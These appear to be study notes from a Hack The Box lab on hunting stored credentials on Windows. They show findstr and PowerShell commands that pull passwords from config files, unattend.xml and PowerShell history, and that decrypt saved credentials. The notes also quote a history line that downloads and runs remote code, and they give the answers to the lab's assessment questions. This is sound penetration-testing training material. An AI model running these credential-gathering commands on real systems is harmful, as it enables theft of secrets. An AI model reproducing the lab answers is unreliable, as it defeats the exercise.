# Credential Hunting

## Application Configuration Files

**Searching for Files**

```powershell-session
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

applications often store passwords in cleartext config files.

## Dictionary Files

**Chrome Dictionary Files**

```powershell-session
PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

Password1234!
```

The user may add these words to their dictionary to avoid the distracting red underline. (often in text editor the red underline under a word for not recognized word)

## Unattended Installation Files

may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.

**Unattend.xml**

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

sysadmins may have created copies of the file in other folders during the development of the image and answer file.

## PowerShell History File

History location

`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.

**Confirming PowerShell History Save Path**

```powershell-session
PS C:\htb> (Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Reading PowerShell History File**

```powershell-session
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```

One-Liner to retrive all powershell history possible from our account

```powershell-session
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

## PowerShell Credentials

often used for scripting and automation tasks as a way to store encrypted credentials conveniently. It's protected using DPAPI, they can **only be drecrypted by same user on the same computer they were created on**.

**Decrypting PowerShell Credentials**

```powershell-session
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

## Assessment

<details>

<summary>Search the file system for a file containing a password. Submit the password as your answer.</summary>

```powershell
PS C:\Users> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
All Users\Druva\inSync4\users\HTB-STUDENT\inSync.cfg
All Users\Microsoft\IdentityCRL\INT\wlidsvcconfig.xml
All Users\Microsoft\IdentityCRL\production\wlidsvcconfig.xml
. . .
htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt
htb-student\AppData\Local\Google\Chrome\User Data\ZxcvbnData\1\passwords.txt
. . .
htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
htb-student\Documents\stuff.txt
Public\Documents\settings.xml
```

last file seems interesting&#x20;

```
PS C:\Users> gc 'C:\Users\Public\Documents\settings.xml' | Select-String password                                       
      <password>Pr0xyadm1nPassw0rd!</password>
     | NOTE: You should either specify username/password OR
      <password>repopwd</password>
```

**`Pr0xyadm1nPassw0rd!`**

</details>

<details>

<summary>Connect as the bob user and practice decrypting the credentials in the pass.xml file. Submit the contents of the flag.txt on the desktop once you are done.</summary>

Confirm the location of pass.xml

```
PS C:\Users\bob> dir C:\scripts\


    Directory: C:\scripts


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/24/2021   6:08 PM           1828 pass.xml

```

The password is encrypted and to get it we have to use the Import-Clixml module in powershell

```
PS C:\Users\bob> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\Users\bob> $credential.GetNetworkCredential().password
Str0ng3ncryptedP@ss!
```

</details>

